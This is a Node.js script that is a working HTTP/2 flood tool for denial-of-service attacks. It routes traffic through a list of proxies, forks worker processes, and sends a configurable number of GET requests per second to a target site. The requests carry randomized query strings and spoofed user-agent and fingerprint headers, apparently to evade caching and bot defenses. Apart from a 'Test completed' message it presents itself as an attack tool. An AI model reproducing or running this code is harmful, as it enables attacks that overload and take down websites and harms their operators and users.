const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

const errorHandler = error => {};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`\nUsage: node d.cjs [target] [time] [rate] [thread] [proxyfile]\n`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

// Cấu hình Header và Fingerprint
const uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
];
const platform = ['Linux', 'macOS', 'Windows'];
const jalist = ["002205d0f96c37c5e660b9f041363c1", "073eede15b2a5a0302d823ecbd5ad15b"];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.brightYellow + args.target);
    console.log(`Time:   `.brightYellow + args.time + "s");
    console.log(`Rate:   `.brightYellow + args.Rate + " r/s");
    console.log(`Thread: `.brightYellow + args.threads);
    console.log(`--------------------------------------------`.gray);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log("\n[!] Test completed.".brightGreen);
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder, 1000); 
}

class NetSocket {
    HTTP(options, callback) {
        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
            connection.write(payload);
        });

        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) {
                callback(connection, undefined);
            } else {
                connection.destroy();
            }
        });

        connection.on("error", () => {
            connection.destroy();
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [proxyHost, proxyPort] = proxyAddr.split(":");

    const proxyOptions = {
        host: proxyHost,
        port: parseInt(proxyPort),
        address: parsedTarget.host,
        timeout: 10,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: {
                    maxConcurrentStreams: 100,
                    initialWindowSize: 65535,
                }
            });

            client.on("connect", () => {
                const attackInterval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const reqHeaders = {
                            ":method": "GET",
                            ":authority": parsedTarget.host,
                            ":path": parsedTarget.path + "?" + randstr(5) + "=" + randstr(20),
                            ":scheme": "https",
                            "user-agent": randomElement(uap),
                            "accept": "*/*",
                            "ja3": randomElement(jalist),
                            "sec-ch-ua-platform": randomElement(platform)
                        };
                        const request = client.request(reqHeaders);
                        request.on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        request.end();
                    }
                }, 1000);
            });

            client.on("error", () => {
                client.destroy();
                connection.destroy();
            });
        });
    });
}
